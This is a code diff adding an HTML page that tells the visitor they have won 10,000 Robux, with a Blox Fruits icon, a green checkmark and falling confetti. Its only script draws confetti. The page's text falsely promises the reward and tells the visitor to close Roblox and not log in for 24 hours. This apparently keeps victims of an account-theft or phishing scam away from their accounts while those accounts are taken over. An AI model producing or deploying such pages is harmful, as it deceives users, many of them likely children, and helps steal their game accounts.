@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Congratulations!</title>
+    <link rel="icon" type="image/x-icon" href="https://i.ibb.co/93sghgtm/blox-fruit-logo.png" />
+    <style>
+        /* Arrière-plan sombre et moderne */
+        body {
+            font-family: Arial, sans-serif;
+            background: #0b0b0b;
+            color: #ffffff;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Message principal */
+        .congrats-message {
+            font-size: 42px;
+            font-weight: bold;
+            text-transform: uppercase;
+            text-align: center;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #00ff00, #00cc66, #009900);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0px 0px 10px rgba(0, 255, 0, 0.8);
+            animation: fadeIn 1.5s ease-in-out;
+        }
+
+        /* Animation de validation */
+        .checkmark-container {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: rgba(0, 255, 0, 0.2);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            animation: scaleUp 1.5s ease-in-out;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+        }
+
+        .checkmark {
+            font-size: 60px;
+            color: #00ff00;
+        }
+
+        /* Confettis */
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: rgba(255, 255, 0, 0.9);
+            opacity: 0;
+            animation: fall linear infinite;
+        }
+
+        /* Message d'attente */
+        .info-message {
+            margin-top: 30px;
+            padding: 15px;
+            max-width: 600px;
+            text-align: center;
+            font-size: 16px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.2);
+            animation: fadeIn 2s ease-in-out;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes scaleUp {
+            from { transform: scale(0.5); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        @keyframes fall {
+            from {
+                transform: translateY(-100vh) rotate(0deg);
+                opacity: 1;
+            }
+            to {
+                transform: translateY(100vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <h1 class="congrats-message">Congratulations! You won 10,000 Robux!</h1>
+    
+    <div class="checkmark-container">
+        <div class="checkmark">✔</div>
+    </div>
+
+    <div class="info-message">
+        ⚠ <b>Important:</b> To ensure the transaction is completed successfully, please <b>close Roblox completely</b> and avoid logging in for the next <b>24 hours</b>.  
+        Our automated system is processing your reward, and <b>any login attempt may interrupt the transaction</b>.  
+        You will receive your <b>10,000 Robux</b> automatically once the process is complete.
+    </div>
+
+    <script>
+        // Génération des confettis
+        function createConfetti() {
+            for (let i = 0; i < 100; i++) {
+                let confetti = document.createElement("div");
+                confetti.className = "confetti";
+                confetti.style.left = Math.random() * 100 + "vw";
+                confetti.style.animationDuration = (Math.random() * 3 + 2) + "s";
+                confetti.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                document.body.appendChild(confetti);
+
+                setTimeout(() => confetti.remove(), 5000);
+            }
+        }
+
+        createConfetti();
+    </script>
+</body>
+</html>
